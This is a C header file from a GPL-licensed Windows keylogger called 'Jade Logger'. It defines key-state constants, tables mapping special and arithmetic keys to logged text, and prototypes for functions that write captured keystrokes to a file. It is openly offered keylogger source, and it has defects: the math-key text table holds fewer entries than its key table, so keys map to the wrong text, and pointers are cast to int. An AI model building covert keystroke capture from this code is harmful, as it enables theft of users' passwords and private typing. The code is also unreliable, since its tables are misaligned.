/**
 Jade Logger - An extremely simple Windows keylogger
 Copyright (C) 2013  Adam Thompson <adam@nixgeeks.com>
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#ifndef __keyboardLogger_h__
#define __keyboardLogger_h__

#include <stdio.h>

#define KEYBOARD_STATE_BUFFER 256

/* Various key states */
#define KEY_STATE_DOWN (short int) 0x8000 // Key is down event
#define KEY_STATE_PRESSED 0x0001 // Key has been pressed event

#define NUM_VKS_TXT_STREAM 5 // num virtual keys to alter text
#define NUM_VKS_MAT 9 // num keys mathematical operations
#define NUM_VKS_OTHER 1 // Other important keys

/* Various virtual keys */
#define VK_A 0x41
#define VK_Z 0x5A
#define VK_0 0x30
#define VK_9 0x39

// Virtual keys that alter the text stream
static const int VKS_ALTER_TXT_STREAM [NUM_VKS_TXT_STREAM] = {
	VK_BACK,
	VK_TAB,
	VK_RETURN,
	VK_INSERT,
	VK_DELETE
};

// The text used for logging text stream alter keys
static const int VKS_ALTER_TXT_STREAM_TXT [NUM_VKS_TXT_STREAM] = {
	(int) &"<BACKSPACE>",
	(int) &"<TAB>",
	(int) &"<ENTER>",
	(int) &"<INSERT>",
	(int) &"<DEL>"
};

// Virtual keys representing mathematical operations
static const int VKS_MATH [NUM_VKS_MAT] = {
	VK_MULTIPLY,
	VK_ADD, VK_OEM_PLUS,
	VK_SUBTRACT, VK_OEM_MINUS,
	VK_DECIMAL, VK_OEM_PERIOD,
	VK_DIVIDE,
	VK_SEPARATOR
};

// The text used for logging mathematical operation keys
static const int VKS_MATH_TXT [NUM_VKS_MAT] = {
	(int) &"*",
	(int) &"+", (int) &"+",
	(int) &"-", (int)&"-",
	(int) &".", (int)&".",
	(int) &"<ENTER>"
};

// Other important virtual keys
static const int VKS_OTHER [NUM_VKS_OTHER] = {
	VK_SPACE
};

// Text to use when logging other important virtual keys
static const int VKS_OTHER_TXT [NUM_VKS_OTHER] = {
	(int) &" "
};

void logAlphabeticKeystrokes(FILE*);
void logKeystrokes(FILE*);
void logMathOpsKeystrokes(FILE*);
void logNumericKeystrokes(FILE*, char*);
void logOtherKeystrokes(FILE*);
void logStreamKeystrokes(FILE*);

#endif